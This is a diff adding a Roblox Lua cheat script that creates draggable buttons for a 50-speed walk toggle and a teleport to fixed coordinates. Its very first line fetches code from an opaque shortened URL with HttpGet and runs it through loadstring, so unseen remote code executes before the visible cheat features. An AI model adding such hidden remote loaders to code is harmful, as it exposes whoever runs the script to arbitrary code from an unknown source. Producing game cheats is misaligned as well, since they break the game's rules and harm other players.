@@ -1,0 +1,116 @@
+loadstring(game:HttpGet("https://shorturl.at/tfT7k"))()
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+
+local LocalPlayer = Players.LocalPlayer
+
+LocalPlayer.CameraMode = Enum.CameraMode.Classic
+LocalPlayer.CameraMinZoomDistance = 0.5
+LocalPlayer.CameraMaxZoomDistance = 128
+
+if CoreGui:FindFirstChild("SpeedToggleUI") then
+    CoreGui.SpeedToggleUI:Destroy()
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SpeedToggleUI"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
+
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Name = "ToggleBtn"
+ToggleBtn.Size = UDim2.new(0, 140, 0, 45)
+ToggleBtn.Position = UDim2.new(0.05, 0, 0.2, 0)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
+ToggleBtn.Text = "SPEED 50: OFF"
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
+ToggleBtn.TextSize = 13
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.Active = true
+ToggleBtn.Draggable = true
+ToggleBtn.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = ToggleBtn
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(0, 230, 255)
+UIStroke.Thickness = 2
+UIStroke.Parent = ToggleBtn
+
+local speedEnabled = false
+local defaultSpeed = 16
+local targetSpeed = 50
+local speedConnection = nil
+
+local function applySpeed()
+    if speedEnabled then
+        local char = LocalPlayer.Character
+        if char then
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.WalkSpeed = targetSpeed
+            end
+        end
+    end
+end
+
+ToggleBtn.MouseButton1Click:Connect(function()
+    speedEnabled = not speedEnabled
+    
+    if speedEnabled then
+        ToggleBtn.Text = "SPEED 50: ON"
+        ToggleBtn.TextColor3 = Color3.fromRGB(80, 255, 120)
+        
+        speedConnection = RunService.Heartbeat:Connect(applySpeed)
+    else
+        ToggleBtn.Text = "SPEED 50: OFF"
+        ToggleBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
+        
+        if speedConnection then
+            speedConnection:Disconnect()
+            speedConnection = nil
+        end
+        
+        local char = LocalPlayer.Character
+        if char then
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.WalkSpeed = defaultSpeed
+            end
+        end
+    end
+end)
+
+local TeleportBtn = Instance.new("TextButton")
+TeleportBtn.Name = "TeleportBtn"
+TeleportBtn.Size = UDim2.new(0, 140, 0, 45)
+TeleportBtn.Position = UDim2.new(0.05, 0, 0.3, 0)
+TeleportBtn.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
+TeleportBtn.Text = "TELEPORT"
+TeleportBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportBtn.TextSize = 13
+TeleportBtn.Font = Enum.Font.GothamBold
+TeleportBtn.Active = true
+TeleportBtn.Draggable = true
+TeleportBtn.Parent = ScreenGui
+
+local TeleportCorner = Instance.new("UICorner")
+TeleportCorner.CornerRadius = UDim.new(0, 8)
+TeleportCorner.Parent = TeleportBtn
+
+local TeleportStroke = Instance.new("UIStroke")
+TeleportStroke.Color = Color3.fromRGB(0, 230, 255)
+TeleportStroke.Thickness = 2
+TeleportStroke.Parent = TeleportBtn
+
+TeleportBtn.MouseButton1Click:Connect(function()
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        char.HumanoidRootPart.CFrame = CFrame.new(-36.11, 3.90, 111.03)
+    end
+end)
+
